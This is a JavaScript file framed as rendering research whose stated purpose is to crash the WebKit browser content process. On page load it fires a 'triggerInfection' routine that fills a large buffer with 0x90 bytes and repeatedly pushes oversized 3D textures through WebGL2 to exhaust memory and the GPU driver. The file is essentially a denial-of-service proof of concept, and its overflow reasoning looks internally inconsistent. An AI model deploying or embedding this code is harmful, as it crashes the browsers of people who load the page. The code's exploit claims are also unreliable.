/**
 * Project: Imposter-OG8 Rendering Research (Aggressive Mode)
 * Description: Forces a WebKit WebContent process crash by creating 
 * massive memory pressure and conflicting stride instructions.
 */

(function() {
    const triggerInfection = () => {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl2');
        if (!gl) return;

        console.log("System Instability Test: Initializing...");

        // 1. THE DECEPTIVE INSTRUCTION (Tiny Allocation)
        gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 1);
        gl.pixelStorei(gl.UNPACK_SKIP_IMAGES, 1);

        // 2. THE MASSIVE OVERFLOW (Huge Data)
        // We use the maximum possible buffer to hit the 32-bit wrap-around limit
        const pressureSize = 1024 * 1024 * 64; // 64MB per layer
        const maliciousData = new Uint8Array(pressureSize).fill(0x90);

        // 3. THE PRESSURE LOOP
        // Instead of one call, we blast the driver with multiple calls
        // to prevent the OS from "cleaning up" fast enough.
        const texture = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_3D, texture);

        let count = 0;
        const blast = setInterval(() => {
            console.log(`Blasting GPU... Iteration: ${++count}`);
            
            // This is the "Bridge" trigger
            gl.texImage3D(
                gl.TEXTURE_3D, 0, gl.RGBA8, 
                2048, 2048, 128, // Massive Dimensions
                0, gl.RGBA, gl.UNSIGNED_BYTE, 
                maliciousData
            );

            if (count > 10) clearInterval(blast);
        }, 50); // Every 50ms
    };

    window.addEventListener('load', triggerInfection);
})();
